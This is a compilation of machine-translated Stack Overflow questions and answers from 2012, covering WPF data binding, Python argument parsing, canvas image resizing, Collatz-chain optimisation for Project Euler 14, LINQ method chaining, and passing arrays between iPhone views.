[http://msdn.microsoft.com/subscriptions/cc150618.aspx](http://msdn.microsoft.com/subscriptions/cc150618.aspx)

> MSDN 订阅按用户授予许可。一个人可以使用该软件在任意数量的设备上设计、开发、测试或演示他或她的程序。每个以这种方式使用软件的人都需要许可证。

我认为让开发人员只运行快速版本是可以的，但他们不应该利用他们没有订阅的任何 MSDN 优势。正如 Chris 所说，您可能应该询问您的销售代表，您是否认为共享诸如分析器之类的工具可能可行。

# c# - 是否可以绑定到私有变量公开属性？

> ID：10078975
> 
> 赞同：0
> 
> 时间：2012-04-09T19:56:21.740
> 
> 标签：c#, wpf, data-binding

我不知道这是否可能，但这里是解释标题中问题的代码：

```
public class LogicClass : INotifyPropertyChanged
{
    private String _myText;
    public String MyText
    {
        get{return _myText;}
        set
        {
            _myText = value; 
            PropertyChanged(this, new PropertyChangedEventArgs("MyText"));
        }
    }
    ...
}

public partial class Window1: Window, INotifyPropertyChanged
{
    private LogicClass _logic;
    public String LogicText
    {
        get{return _logic.MyText;}
    }
    ...
}

<ContentControl Name="contentControl1" >
    <Binding ElementName="MainWindow" Path="LogicText"/>
</ContentControl> 
```

有什么方法可以使这项工作，而不必公开我的`LogicClass`变量并利用它的`INotifyPropertyChanged`. 我想我想知道这是否会冒泡，或者除了`set`在我的 UI 代码隐藏中必须有冗余之外的其他任何东西（这就是我现在这样做的方式）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:59:53.523

是的，您需要从 _logic 处理 PropertyChanged 事件，然后在 LogicText 上引发等效的 PropertyChanged 通知，或者您需要在 MyText 上添加一个标准事件，因此您将有一个 MyTextChanged 事件，处理此事件，然后为 LogicText 引发 PropertyChanged .

因此，如果 LogicClass 从未直接绑定到 Xaml 中，则无需在 LogicClass 上实现 INotifyPropertyChanged 并且可以执行（类似的操作）：

```
public class LogicClass
{
    private String _myText;

    public event EventHandler MyTextChanged;

    public String MyText
    {
        get{return _myText;}
        set
        {
            _myText = value; 
            var handler = MyTextChanged;
            if(handler != null){ MyTextChanged(this, EventArgs.Empty); }
        }
    }
    ...
}

public partial class Window1: Window, INotifyPropertyChanged
{
    private LogicClass _logic;

    public Window1()
    {
       _logic = ... initialised;
       _logic.MyTextChanged += (s,e) => RaisePropertyChanged("LogicText");
    }

    public String LogicText
    {
        get{return _logic.MyText;}
    }
    ...
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T20:02:07.247

如果您要问的是您是否可以以某种声明性方式本质上说“此属性代表另一个类上的另一个属性，因此您需要查看它是否发生变化”，那么不，那是不可能的。但是，您可以自己模仿这种行为。只需附加到`PropertyChanged`逻辑类上的事件，当`MyText`属性更改时，`PropertyChanged`通过调用`OnPropertyChanged`.

请注意，这几乎肯定更适合您的`ViewModel`内容，而不是窗口代码隐藏中的内容。

# python - 使用 OptionParser 与 sys.argv

> ID：10078979
> 
> 赞同：2
> 
> 时间：2012-04-09T19:56:29.390
> 
> 标签：python

对于脚本，我目前正在使用`OptionParser`将变量添加到输入中。但是，我当前的所有选项都是布尔值，而且使用它似乎更容易解析`argv`。例如：

```
 $ script.py option1 option4 option6 
```

然后执行以下操作：

```
if 'option1' in argv:
    do this
if 'option2' in argv:
    do this
etc... 
```

何时可以使用何时何时可以使用`argv`Booleans `OptionParser`？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-09T19:58:37.033

> “但是，我当前的所有选项都是布尔值，而且使用 argv 似乎更容易解析。”

使用 argv 没有任何问题，如果使用 argv 更简单，那就没有理由不这样做。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T20:36:55.063

OptionParser 已被弃用，除非您被困在较旧版本的 python 上，否则您应该使用 ArgParser 模块。

对于一次性脚本，自己解析 sys.argv 没有任何问题。使用参数解析模块而不是编写自己的模块有一些优点。

*   标准化。你是否允许像“-test”这样的选项，因为标准通常是多字符选项的两个下划线（例如“--test”）。使用模块，您不必担心定义标准，因为它们已经定义好了。
*   您需要错误捕获和帮助信息吗？因为你可以通过 ArgParse 免费获得很多。
*   其他人会维护您的代码吗？已经有很多关于 ArgParse 的文档和示例。另外，它有点自我记录，因为您必须指定参数的类型和数量，这在查看 sys.argv 解析器时并不总是显而易见的。

基本上，如果您期望您的命令行选项会随着时间而改变，或者期望您的代码必须由其他人修改，那么 ArgParse 的开销并不是那么糟糕，并且可能会在将来为您节省时间。

# javascript - 为下载客户端调整图像大小

> ID：10078981
> 
> 赞同：0
> 
> 时间：2012-04-09T19:56:54.183
> 
> 标签：javascript, html, air

有没有办法通过任何类型的客户端脚本来获取外部图像（例如：[http](http://www.google.com/image.jpg) ://www.google.com/image.jpg ）并在用户复制图像时调整它的大小，以便调整粘贴的图像的大小? 而且我无法让 HTML5 画布工作。

我正在使用 Dreamweaver CS5.5 并创建一个 Air 应用程序。该代码在实时视图中有效，但在我预览 Air App 时无效。这是不起作用的代码：

```
function test(){

var canvas = document.getElementById("myCanvas");
var context = canvas.getContext("2d");
var img = new Image();
img.onload = function(){
context.drawImage(img, 0,0);
};

img.src="image.jpg";

 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T21:07:11.533

您可以尝试绘制图像，然后`img.src = canvas.toDataURL('image/png')`在用户拖动之前进行。这将导致画布将其数据输出到图像标签。画布应该是不可见的，而图像是用户应该拖动的可见元素。

要调整图像大小，请在[drawImage](https://developer.mozilla.org/en/Canvas_tutorial/Using_images#Scaling)中指定宽度和高度。

# python - 如何改进我的 euler 14 代码？

> ID：10078987
> 
> 赞同：6
> 
> 时间：2012-04-09T19:57:29.257
> 
> 标签：python

我解决了[欧拉问题 14](http://projecteuler.net/problem=14)，但我使用的程序很慢。我看看其他人做了什么，他们都想出了优雅的解决方案。我试图理解他们的代码，但没有取得多大成功。

这是我的代码（确定 Collat​​z 链长度的函数

```
def collatz(n):
a=1
while n!=1:
    if n%2==0:
        n=n/2
    else:
        n=3*n+1
    a+=1
return a 
```

然后我使用了蛮力。它很慢，我知道它很弱。有人可以告诉我为什么我的代码很弱，以及如何用简单的英语改进我的代码。请记住，我是初学者，我的编程技能是基本的。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-09T20:02:17.497

与其计算从头到尾的每条可能的链，您可以保留链开始的缓存及其结果长度。例如，对于链

```
13 40  20  10  5  16  8  4  2  1 
```

你可以记住以下内容：

1.  以 13 开头的 Collat​​z 链的长度为 10
2.  以 40 开头的 Collat​​z 链的长度为 9
3.  以 20 开头的 Collat​​z 链的长度为 8

... 等等。

然后，一旦我们遇到一个已经在缓存中的数字，我们就可以使用这些保存的信息来停止计算链。

### 执行

使用 Python 中的字典将起始数字与其链长度相关联：

```
chain_sizes = {}
chain_sizes[13] = 10
chain_sizes[40] = 9
chain_sizes[40]   # => 9
20 in chain_sizes # => False 
```

现在你只需要调整你的算法来使用这个字典（用值填充它以及查找中间数字）。

顺便说一句，这可以使用递归很好地表达。这里可能出现的链大小不会溢出堆栈:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-14T21:21:45.950

简而言之，因为我的英语很糟糕;-)

```
Forall n >= 1, C(n) = n/2     if n even,
                      3*n + 1 if n odd 
```

可以一次计算几个连续的迭代。

以 k`0`位结尾的数字的第 k 次迭代：

```
C^k(a*2^k) = a 
```

`1`以 k位结尾的数字的第 (2k) 次迭代：

```
C^(2k)(a*2^k + 2^k - 1) = a*3^k + 3^k - 1 = (a + 1)*3^k - 1 
```

参照。维基百科文章的公式[（法语）](http://fr.wikipedia.org/wiki/Discussion%3aConjecture_de_Syracuse#Modifications_en_cours)；另请参阅[我的网站](http://www.opimedia.be/3nP1/)（法语）和我的 Python 包 DSPython 中的[模块](http://www.opimedia.be/DS/DSPython/)[tnp1](http://www.opimedia.be/DS/DSPython/DSPython_html/namespace_d_s_python_1_1tnp1.htm#a9763c3e54bec1e78786b2ac019bec244)。

将以下代码与 Niklas B 解释的记忆技术结合起来：

```
#!/usr/bin/env python
# -*- coding: latin-1 -*-
from __future__ import division  # Python 3 style in Python 2
from __future__ import print_function  # Python 3 style in Python 2

def C(n):
    """Pre: n: int >= 1
    Result: int >= 1"""
    return (n//2 if n%2 == 0
            else n*3 + 1)

def Ck(n, k):
    """Pre: n: int >= 1
         k: int >= 0
    Result: int >= 1"""
    while k > 0:
        while (n%2 == 0) and k:  # n even
            n //= 2
            k -= 1

        if (n == 1) and k:
            n = 4
            k -= 1
        else:
            nb = 0
            while (n > 1) and n%2 and (k > 1):  # n odd != 1
                n //= 2
                nb += 1
                k -= 2

            if n%2 and (k == 1):
                n = (n + 1)*(3**(nb + 1)) - 2
                k -= 1
            elif nb:
                n = (n + 1)*(3**nb) - 1

    return n

def C_length(n):
    """Pre: n: int >= 1
    Result: int >= 1"""
    l = 1

    while n > 1:
        while (n > 1) and (n%2 == 0):  # n even
            n //= 2
            l += 1

        nb = 0
        while (n > 1) and n%2:  # n odd != 1
            n //= 2
            nb += 1
            l += 2
        if nb:
            n = (n + 1)*(3**nb) - 1

    return l

if __name__ == '__main__':
    for n in range(1, 51):
        print(n, ': length =', C_length(n)) 
```

# c# - 链接 IEnumerable 的首选（高性能和可读）方式是什么 扩展方法？

> ID：10078989
> 
> 赞同：6
> 
> 时间：2012-04-09T19:57:37.013
> 
> 标签：c#, .net, extension-methods, ienumerable

如果我试图在`IEnumerable<T>`对象图的多个级别过滤结果，是否有链接扩展方法的首选方法来执行此操作？

我对任何扩展方法和 lambda 用法持开放态度，但我不希望使用 LINQ 语法来与代码库的其余部分保持一致。

将过滤推送到方法`selector`中`SelectMany()`还是仅仅链接另一个`Where()`方法更好？还是有更好的解决方案？

我将如何确定最佳选择？在这个测试用例中，一切都直接在内存中可用。显然，下面的两个样本目前都产生了相同的正确结果；我只是在寻找一个或另一个（或另一种选择）更受欢迎的原因。

```
public class Test
{
    // I want the first chapter of a book that's exactly 42 pages, written by
    // an author whose name is Adams, from a library in London.
    public Chapter TestingIEnumerableTExtensionMethods()
    {
        List<Library> libraries = GetLibraries();

        Chapter chapter = libraries
            .Where(lib => lib.City == "London")
            .SelectMany(lib => lib.Books)
            .Where(b => b.Author == "Adams")
            .SelectMany(b => b.Chapters)
            .First(c => c.NumberOfPages == 42);

        Chapter chapter2 = libraries
            .Where(lib => lib.City == "London")
            .SelectMany(lib => lib.Books.Where(b => b.Author == "Adams"))
            .SelectMany(b => b.Chapters.Where(c => c.NumberOfPages == 42))
            .First();
    } 
```

这是示例对象图：

```
public class Library
{
    public string Name { get; set; }
    public string City { get; set; }
    public List<Book> Books { get; set; }
}

public class Book
{
    public string Name { get; set; }
    public string Author { get; set; }
    public List<Chapter> Chapters { get; set; }
}

public class Chapter
{
    public string Name { get; set; }
    public int NumberOfPages { get; set; }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T20:07:50.877

哪个最有可能根据您使用的 LINQ 实现而有所不同。LinqToSql 的行为与内存过滤不同。子句的顺序应该会影响性能，具体取决于使用的数据，因为幼稚的实现会在序列的前面过滤更多的记录，这意味着后面的方法的工作量会减少。

对于您的两个示例，我猜想性能差异可以忽略不计，并且会支持第一个示例，因为它允许更轻松地修改每个子句，而独立于其他子句。

至于确定最佳选择，它与其他任何事情一样：衡量。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T20:06:39.970

我猜你的第一个表达方式会稍微快一点，但速度并不明显。要真正确定其中一个是否更快，您需要使用分析器或秒表对它们进行计时。

无论哪种方式，可读性似乎都没有受到强烈影响。我更喜欢第一种方法，因为它的嵌套级别更少。这完全取决于您的个人喜好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T20:06:23.357

这取决于底层 LINQ 提供程序的工作方式。对于 LINQ to Objects，在这种情况下，两者都需要大约相同数量的工作，或多或少。但这是最直接（最简单）的例子，除此之外很难说。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T23:23:28.293

这可能会给你一个不同的角度，虽然这更多的是风格问题......
我有时会发现自己在做这样的事情......

```
return libraries.Filter(
        l => l.City == "",
        l => l.Books,
        b => b.Author == "Adams",
        b => b.Chapters,
        c => c.NumberOfPages == 42
        ); 
```

...在那里您可以猜到扩展名是什么，例如...

```
public static IEnumerable<TC> Filter<TL, TB, TC>(this IEnumerable<TL> list,
    Func<TL, bool> whereLs,
    Func<TL, IEnumerable<TB>> selectBs,
    Func<TB, bool> whereBs,
    Func<TB, IEnumerable<TC>> selectCs,
    Func<TC, bool> whereCs
    )
{
    return list
        .Where(whereLs)
        .SelectMany(selectBs)
        .Where(whereBs)
        .SelectMany(selectCs)
        .Where(whereCs);
} 
```

...或者....

```
...    
{
    return list
        .Where(whereLs)
        .SelectMany(l => selectBs(l).Where(whereBs))
        .SelectMany(b => selectCs(b).Where(whereCs));
} 
```

组合/选项很多，具体取决于您拥有什么，您“喜欢如何拥有您的代码”（更多抽象或“捕获”、“参数化”`PerCityAuthorPages(_city, _author, _numPages);`等）

...基本上，我不喜欢拥有所有的'Where'，'Select'-s等，对我来说不是那么可读（或者）。虽然使用“短形式”，但很清楚哪个是哪个，在哪里，选择等，而且它非常“速记”，而且字符少得多。

此外，您可以推迟关于 Where/Select 组合的决定以供以后使用（根据需要，提供者做一个或另一个）

@Telastyn 是非常正确的，LINQ 提供程序，例如，如果您查看一些实现代码，
所有表达式都减少等。
它们是非常不确定的（即从提供程序到提供程序），
尽管它们最终可能会映射到例如 SQL这在我认为的大多数情况下应该是相同的。

# iphone - 从另一个类调用数组

> ID：10078992
> 
> 赞同：0
> 
> 时间：2012-04-09T19:57:41.543
> 
> 标签：iphone, objective-c, cocoa-touch

仍在尝试掌握 iPhone 编程并遇到了问题。我在一个类中有一个 NSMutableArray ，它存储选择/单击的每个单元格的文本值。在另一个视图中，我想用之前形成的数组填充另一个表视图。但是，我该如何从 View2 访问这个数组（它是 View1 中的一个属性）。

如果我转到另一个视图，数组是否仍会被字符串填充？或者这是否需要一个 sqLite DB 或类似的东西来保持持久性？

我尝试使用 View1 中的数组内容初始化另一个 NSMutableArray，但这似乎不正确：

```
//View2.h
- (void)viewDidLoad {
    [super viewDidLoad];

    NSMutableArray *savedExercise = [Create workout];
} 
```

任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T20:01:47.990

如果你从 view1 创建 view2，一个常见的模式是创建另一个 init 方法，所以当你创建 view 2 时，你会调用

```
view2 = [[View2 alloc] initWithData:data]; 
```

其中 data 是您的数组。

在 View2 中，您将拥有

```
-(id)initWithData:(NSArray*)_data{
    self = [super init];
    if(self){
        dataProperty = _data;
    }
    return self;
} 
```

其中 dataProperty 是 View2 上的一个属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T20:05:24.107

您应该为 View1 中的实例变量“workout”创建 getter（如果需要，还可以创建 setter）方法。为此，您可以使用 Objective-C 的 @property 功能。

然后在 View2 中访问 View1 的实例以获取指向`workout`.

更好的方法是创建一个单例“数据管理器”并通过 sharedInstance 方法访问它（正如我们在聊天中讨论的那样）。然后，您的数据完全由该实例管理，并且可以通过与该共享实例“交谈”随时在您的应用程序的任何部分访问。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T20:08:37.517

如果您的应用程序是 iOS 5 特定的并且您从 View1 转到 View2，您可以使用 segues 和 prepareForSegue 来传递数据。

您将调用 segue，`performSegueWithIdentifier:sender:`然后在您的 prepareForSegue 方法中您可以执行以下操作：`[segue.destinationViewController setArray:###pass array here###]`您只需要在 View2Controller 的标头中有一个属性，该属性具有一个名为 setArray 的设置器（或您想要命名的任何名称）。